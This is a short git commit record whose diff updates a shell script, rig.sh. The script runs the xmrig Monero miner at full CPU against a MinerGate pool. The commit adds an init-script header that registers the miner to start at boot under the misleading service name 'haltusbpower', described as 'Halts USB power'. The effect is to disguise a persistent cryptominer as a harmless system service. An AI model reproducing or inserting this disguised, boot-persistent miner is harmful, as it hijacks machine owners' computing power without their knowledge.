b589f9cbd7d0a0da11c4d8230cd5ad61161c7dc0
Big_ort <adytamasurya@gmail.com>
2019-02-22 23:01:52 +0700

    Update rig.sh

--- rig.sh
+++ rig.sh
@@ -1,1 +1,11 @@
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides:          haltusbpower
+# Required-Start:    $all
+# Required-Stop:
+# Default-Start:     2 3 4 5
+# Default-Stop:
+# Short-Description: Halts USB power...
 xmrig --print-time 7 --max-cpu-usage 100 -o xmr.pool.minergate.com:45700 -u adynikez@gmail.com -p x -k --nicehash
+### END INIT INFO
+
